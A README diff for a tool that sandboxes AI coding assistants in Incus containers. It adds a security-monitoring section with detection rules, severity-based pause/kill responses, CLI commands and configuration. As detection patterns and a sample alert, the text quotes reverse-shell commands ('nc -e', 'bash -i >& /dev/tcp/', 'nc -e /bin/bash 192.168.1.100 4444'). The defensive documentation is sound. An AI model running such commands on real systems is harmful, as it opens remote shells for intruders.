@@ -34,6 +34,7 @@ Run AI coding assistants (Claude Code, Aider, and more) in isolated, production-
 - [System Health Check](https://github.com/mensfeld/code-on-incus/wiki/System-Health-Check)
 - [Container Lifecycle & Session Persistence](https://github.com/mensfeld/code-on-incus/wiki/Container-Lifecycle-and-Sessions)
 - [Network Isolation](https://github.com/mensfeld/code-on-incus/wiki/Network-Isolation)
+- [Security Monitoring](#security-monitoring)
 - [Resource and Time Limits](https://github.com/mensfeld/code-on-incus/wiki/Resource-and-Time-Limits)
 - [Security Best Practices](https://github.com/mensfeld/code-on-incus/wiki/Security-Best-Practices)
 - [Troubleshooting](https://github.com/mensfeld/code-on-incus/wiki/Troubleshooting)
@@ -68,6 +69,7 @@ The tool abstraction layer makes it easy to add support for new AI coding assist
 - Project separation - Complete isolation between workspaces
 - Credential protection - No risk of SSH keys, `.env` files, or Git credentials being exposed to AI tools
 - Network isolation - Built-in firewalld limits block private network access and prevent data exfiltration (restricted/allowlist modes)
+- **Real-time security monitoring** - Always-on threat detection for reverse shells, data exfiltration, and environment scanning with automated response
 
 **Safe Dangerous Operations**
 - AI coding tools often need broad filesystem access or bypass permission checks
@@ -584,6 +586,72 @@ curl http://<container-ip>:3000
 ```
 
 **Note:** Network isolation requires firewalld. Use `--network=open` or see the guide for firewalld setup instructions.
+
+## Security Monitoring
+
+`coi` includes **always-on security monitoring** to detect and respond to malicious behavior in real-time. The monitoring daemon runs automatically during sessions and protects against:
+
+**Threat Detection:**
+- **Reverse shells** - Detects `nc -e`, `bash -i >& /dev/tcp/`, Python/Perl/Ruby reverse shell patterns
+- **Data exfiltration** - Monitors large workspace reads that may indicate code theft attempts
+- **Environment scanning** - Flags processes searching for API keys, secrets, and credentials
+- **Unexpected network connections** - Detects connections to suspicious IPs/ports or outside allowlist
+
+**Automated Response:**
+- **INFO**: Logged for review
+- **WARNING**: Logged + displayed as alert
+- **HIGH**: Logged + alert + **container paused** (requires manual resume)
+- **CRITICAL**: Logged + alert + **container killed immediately**
+
+**View Real-Time Monitoring:**
+```bash
+# Monitor a running container
+coi monitor coi-abc-1
+
+# Watch mode (updates every 2 seconds)
+coi monitor coi-abc-1 --watch 2
+
+# JSON output for scripting
+coi monitor coi-abc-1 --json
+```
+
+**Review Audit Log:**
+```bash
+# View all security events
+coi monitor audit coi-abc-1
+
+# Filter by severity
+coi monitor audit coi-abc-1 --level=critical,high
+
+# Export for analysis
+coi monitor audit coi-abc-1 --export=report.json
+```
+
+**Example Alert:**
+```
+⚠ SECURITY ALERT [CRITICAL]
+Reverse shell detected
+
+Process 'nc -e /bin/bash 192.168.1.100 4444' (PID 1235) matches reverse shell pattern 'nc -e'
+
+→ Action taken: killed
+→ Logged to audit: ~/.coi/audit/coi-abc-1.jsonl
+```
+
+**Configuration:**
+```toml
+# ~/.config/coi/config.toml
+[monitoring]
+enabled = true                    # Enable/disable monitoring
+auto_pause_on_high = true        # Pause on high-severity threats
+auto_kill_on_critical = true     # Kill on critical threats
+poll_interval_sec = 2            # Monitoring frequency
+file_read_threshold_mb = 50.0    # MB read before alerting
+file_read_rate_mb_per_sec = 10.0 # Sustained read rate threshold
+audit_log_retention_days = 30    # Audit log retention
+```
+
+**Audit logs** are stored at `~/.coi/audit/<container-name>.jsonl` in JSON Lines format for forensics and compliance.
 
 ## Security Best Practices
 
